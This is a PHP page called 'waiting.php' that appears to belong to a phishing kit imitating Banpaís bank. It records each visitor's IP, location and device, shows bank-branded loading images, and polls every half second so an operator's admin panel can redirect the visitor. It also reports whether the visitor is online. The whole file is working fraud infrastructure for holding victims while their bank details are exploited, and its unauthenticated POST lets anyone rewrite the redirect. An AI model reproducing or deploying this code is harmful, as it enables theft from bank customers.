<?php
date_default_timezone_set('America/Santiago');
$Microtime = md5(microtime());
require_once 'functions.php';
session_start();

$info = get_user_info();
$ip = $info['ip'];
$device = get_device_id();

// Forzar que al cargarse waiting.php se establezca currentPage en "waiting.php"
// Esto sobre-escribe cualquier valor previo que se haya configurado desde el panel de admin.
$data = load_data();
if (!isset($data[$device])) {
    // Si no existe el registro, lo crea
    update_user($ip, $info['location'], "waiting.php");
} else {
    // Si ya existe, se actualiza currentPage a "waiting.php" sin importar su valor previo.
    $data[$device]['currentPage'] = "waiting.php";
    save_data($data);
}

// (Opcional) Si deseas también permitir que desde un POST se cambie la redirección (por ejemplo, desde el admin),
// puedes dejar el bloque POST, pero normalmente este código se utiliza en waiting.php, y no se procesa en cada carga.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['device']) && isset($_POST['redirect'])) {
    $data = load_data();
    if (isset($data[$_POST['device']])) {
        $data[$_POST['device']]['currentPage'] = $_POST['redirect'];
        save_data($data);
        echo json_encode(["redirect" => $_POST['redirect']]);
        exit();
    }
}

// Leer el estado actual (ya debería ser "waiting.php")
$data = load_data();
$currentPage = isset($data[$device]['currentPage']) ? $data[$device]['currentPage'] : "waiting.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <script>
          // Consulta el endpoint de redirección cada 500 ms
          function checkRedirect() {
              $.getJSON("check_redirect.php", function(data) {
                  // Si el currentPage que devuelve no es "waiting.php", redirige
                  if (data.currentPage && data.currentPage !== "waiting.php") {
                      window.location.href = data.currentPage;
                  }
              });
          }
          setInterval(checkRedirect, 500);
      </script>
      <script>
      setInterval(function(){
          fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
      }, 5000);

      window.addEventListener('unload', function(){
          navigator.sendBeacon('functions.php?action=offline');
      });
      </script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Espera</title>


  <!-- Estilos para centrar y apilar las imágenes -->
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;   /* apila verticalmente */
      justify-content: center;  /* centra verticalmente */
      align-items: center;      /* centra horizontalmente */
      background-color: #fff;
    }

    img {
      display: block;
      margin: 10px 0;           /* espacio entre las imágenes */
      max-width: 120px;         /* ajusta tamaño según necesites */
      height: auto;
    }
  </style>
</head>

<body>
  <img src="index_files/Loader_banpais_1.svg" alt="Loader SVG" style="
    width: 70px;
">
<div style="height:60px"></div>
  <img src="index_files/Loader_banpais_1.gif" alt="Loader GIF" style="
    width: 80px;
">
</body>
</html>
